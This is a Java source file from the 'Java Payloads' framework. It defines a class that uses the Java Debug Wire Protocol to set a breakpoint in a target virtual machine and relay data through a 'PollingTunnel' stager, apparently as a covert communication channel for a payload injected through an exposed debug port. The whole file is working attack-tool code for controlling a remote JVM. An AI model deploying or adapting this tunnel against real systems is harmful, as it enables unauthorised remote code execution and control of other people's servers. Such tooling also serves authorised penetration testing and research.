/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import java.io.PrintStream;
import java.util.Arrays;

import javapayload.handler.stager.PollingTunnel;

import com.sun.jdi.ClassType;
import com.sun.jdi.Location;
import com.sun.jdi.Method;
import com.sun.jdi.ObjectReference;
import com.sun.jdi.StringReference;
import com.sun.jdi.ThreadReference;
import com.sun.jdi.VirtualMachine;
import com.sun.jdi.event.BreakpointEvent;
import com.sun.jdi.event.Event;
import com.sun.jdi.event.EventIterator;
import com.sun.jdi.event.EventSet;
import com.sun.jdi.request.BreakpointRequest;
import com.sun.jdi.request.EventRequest;

public class JDWPPollingCommunicationInterface extends Thread implements PollingTunnel.CommunicationInterface {

	private final VirtualMachine vm;
	private final PrintStream errorStream;
	boolean dataAvailable = false;
	String data = null;
	private final ClassType pollingTunnel;

	public JDWPPollingCommunicationInterface(ClassType pollingTunnel, PrintStream errorStream) {
		this.pollingTunnel = pollingTunnel;
		this.vm = pollingTunnel.virtualMachine();
		this.errorStream = errorStream;
		start();
	}

	public void run() {
		try {
			Method sendData = (Method) pollingTunnel.methodsByName("sendData").get(0);
			Location waitloop = ((Method) pollingTunnel.methodsByName("waitloop").get(0)).locationOfCodeIndex(0);
			BreakpointRequest req = vm.eventRequestManager().createBreakpointRequest(waitloop);
			req.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
			req.setEnabled(true);
			final com.sun.jdi.event.EventQueue q = vm.eventQueue();
			boolean done = false;
			while (true) {
				final EventSet es;
				if (!done) {
					es = q.remove();
				} else {
					es = q.remove(1000);
					if (es == null) {
						break;
					}
				}
				for (final EventIterator ei = es.eventIterator(); ei.hasNext();) {
					final Event e = ei.nextEvent();
					if (e instanceof BreakpointEvent) {
						final BreakpointEvent be = (BreakpointEvent) e;
						final Location loc = be.location();
						final ThreadReference tr = be.thread();
						if (loc.equals(waitloop)) {
							e.request().disable();
							ObjectReference thiz = (ObjectReference) tr.frame(0).thisObject();
							while (true) {
								String request;
								synchronized (this) {
									while (!dataAvailable || data == null)
										wait();
									request = data;
									data = null;
									notifyAll();
								}
								String response = ((StringReference) thiz.invokeMethod(tr, sendData, Arrays.asList(new StringReference[] { vm.mirrorOf(request) }), 0)).value();
								synchronized (this) {
									while (!dataAvailable || data != null)
										wait();
									dataAvailable = false;
									data = response;
									notifyAll();
								}
								if (response.equals("1"))
									break;
							}
							done = true;
						} else {
							throw new RuntimeException("Unknown location: " + loc);
						}
					} else {
						System.out.println("== Unknown event received: " + e.toString());
					}
				}
				es.resume();
			}
		} catch (Throwable t) {
			t.printStackTrace(errorStream);
		}
	}

	public String sendData(String request) throws Exception {
		String result;
		synchronized (this) {
			while (dataAvailable || data != null)
				wait();
			dataAvailable = true;
			data = request;
			notifyAll();
			while (dataAvailable || data == null)
				wait();
			result = data;
			data = null;
		}
		return result;
	}
}
